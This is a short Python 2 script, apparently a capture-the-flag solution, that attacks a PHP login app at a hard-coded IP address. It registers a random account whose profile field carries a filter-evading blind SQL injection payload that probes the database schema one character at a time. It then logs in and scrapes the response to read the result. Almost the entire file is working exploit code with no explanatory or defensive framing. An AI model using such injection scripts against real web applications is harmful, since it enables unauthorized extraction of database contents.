# -*- coding:utf-8 -*-
import requests
import re
import random

s = requests.Session()
astr = "zxcvbnmlkjhgfdsaqwertyuiop0987654321_"
name = "af{}@ev.com".format(str(random.randint(1, 999999999)))
print name
regdata  = {"email":name, "pass":"1234", "userinfo":"'or/**/hex(substr((select/**/schema()),1,1))=hex('nx')#"}
regurl = "http://47.75.55.61/vlogin/reg.php"
res = s.post(regurl, data=regdata)
# print res.text
logurl = "http://47.75.55.61/vlogin/login.php"
logdata = {"loginuser":name, "loginpass":"1234"}
res = s.post(logurl, data=logdata)
indexurl = "http://47.75.55.61/vlogin/vpage/index.php"
res = s.get(indexurl)
# print res.text
hack = re.findall(r"(?<=<p>hac).{10}", res.text)
img = re.findall(r"(?<=<img src=\").{9}", res.text)
print hack
print img

